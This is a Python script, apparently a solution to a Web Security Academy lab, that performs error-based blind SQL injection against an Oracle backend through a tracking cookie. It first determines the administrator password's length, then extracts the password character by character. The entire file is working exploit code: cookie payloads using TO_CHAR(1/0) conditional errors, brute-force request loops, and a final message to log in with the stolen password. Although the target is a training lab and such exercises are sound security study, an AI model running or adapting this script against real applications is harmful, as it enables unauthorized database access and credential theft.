import requests
import sys


def exploit_error_based_sqli():
    # Replace these with urs
    url = "https://0ab100bd044ca80680e21cae0069001c.web-security-academy.net/"
    tracking_cookie = "XC6XBUwJqFT5xxM0"

    print("Starting error-based blind SQL injection (Oracle)...")

    # First,verify the injection works by causing an error
    test_payload = "' || (SELECT '' FROM DUAL) || '"
    cookies = {"TrackingId": tracking_cookie + test_payload}

    try:
        response = requests.get(url, cookies=cookies)
        # If we get a normal response, the injection works
        print("Injection point verified")
    except Exception as e:
        print(f"Error: {e}")
        return

    # Step 1: Find password length
    print("Finding password length...")
    password_length = find_password_length(url, tracking_cookie)
    if not password_length:
        print("Failed to find password length")
        return

    print(f"Password length: {password_length}")

    # Step 2: Extract password
    password = extract_password(url, tracking_cookie, password_length)
    print(f"Administrator password: {password}")

    return password


def find_password_length(url, tracking_cookie, max_length=30):
    """Find password length using error-based SQL injection"""
    for length in range(1, max_length + 1):
        # Oracle-specific payload that causes error when condition is TRUE
        payload = f"' || (SELECT CASE WHEN LENGTH(password)={length} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '"

        cookies = {"TrackingId": tracking_cookie + payload}

        try:
            response = requests.get(url, cookies=cookies)
            # If we get an error (condition was true), we found the length
            if response.status_code == 500:  # Internal Server Error
                return length
        except Exception as e:
            continue

    return None


def extract_password(url, tracking_cookie, password_length):
    """Extract password character by character using error-based injection"""
    characters = "abcdefghijklmnopqrstuvwxyz0123456789"
    password = ""

    print("Extracting password...")

    for position in range(1, password_length + 1):
        found_char = None

        for char in characters:
            # Oracle payload: cause error when character matches
            payload = f"' || (SELECT CASE WHEN SUBSTR(password,{position},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '"

            cookies = {"TrackingId": tracking_cookie + payload}

            try:
                response = requests.get(url, cookies=cookies)

                # If we get an error, the character is correct
                if response.status_code == 500:
                    found_char = char
                    password += char
                    print(f"Position {position}: {char} | Password: {password}")
                    break

            except Exception as e:
                continue

        # If not found in lowercase, try uppercase
        if not found_char:
            for char in characters.upper():
                payload = f"' || (SELECT CASE WHEN SUBSTR(password,{position},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '"

                cookies = {"TrackingId": tracking_cookie + payload}

                try:
                    response = requests.get(url, cookies=cookies)
                    if response.status_code == 500:
                        found_char = char
                        password += char
                        print(f"Position {position}: {char} | Password: {password}")
                        break
                except:
                    continue

        if not found_char:
            password += "?"
            print(f"Position {position}: ? | Password: {password}")

    return password


# Alternative method using different Oracle syntax
def alternative_extract_password(url, tracking_cookie, password_length):
    """Alternative extraction method using different Oracle functions"""
    characters = "abcdefghijklmnopqrstuvwxyz0123456789"
    password = ""

    print("Extracting password (alternative method)...")

    for position in range(1, password_length + 1):
        for char in characters:
            # Alternative Oracle payload using different error generation
            payload = f"' || (SELECT CASE WHEN ASCII(SUBSTR(password,{position},1))={ord(char)} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '"

            cookies = {"TrackingId": tracking_cookie + payload}

            try:
                response = requests.get(url, cookies=cookies)
                if response.status_code == 500:
                    password += char
                    print(f"Position {position}: {char} | Password: {password}")
                    break
            except:
                continue

    return password


if __name__ == "__main__":
    password = exploit_error_based_sqli()
    if password:
        print(f"\nUse this password to login as administrator: {password}")
    else:
        print("Failed to extract password")
